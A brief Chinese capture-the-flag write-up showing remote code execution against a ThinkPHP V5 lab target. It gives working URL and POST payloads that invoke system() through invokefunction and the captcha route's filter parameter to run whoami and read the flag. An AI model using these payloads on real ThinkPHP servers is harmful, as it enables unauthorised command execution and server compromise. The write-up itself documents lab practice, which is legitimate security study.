打开靶场地址就是这个样子

![图片.png](https://image.3001.net/images/20210518/1621327223_60a37d770080db4eda52d.png!small)

用的是ThinkpPHP V5，我也懒得用扫描工具了，直接网上找漏洞

![图片.png](https://image.3001.net/images/20210518/1621327370_60a37e0a422bcaa8cc251.png!small)

试一下payload

    
    
    index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
    

命令直接执行成功  
![图片.png](https://image.3001.net/images/20210518/1621327478_60a37e769ecaa692fb3fa.png!small)

然后就构造获取flag的payload

一步一步获取flag

    
    
    ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php -r 'system("whoami");'
    

![图片.png](https://image.3001.net/images/20210518/1621329303_60a385976910c5f028a8c.png!small)

    
    
    ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system(%22whoami%22);%27
    

ge.3001.net/images/20210518/1621329454_60a3862ec29e823d5880b.png!small)

    
    
    ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system(%22cat%20/flag%20/flag%22);%27
    

![图片.png](https://image.3001.net/images/20210518/1621329568_60a386a04abd07a339011.png!small)

未开启调试模式

    
    
    http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha
    

POST传入

    
    
    _method=__construct&filter[]=system&method=get&get[]=whoami
    

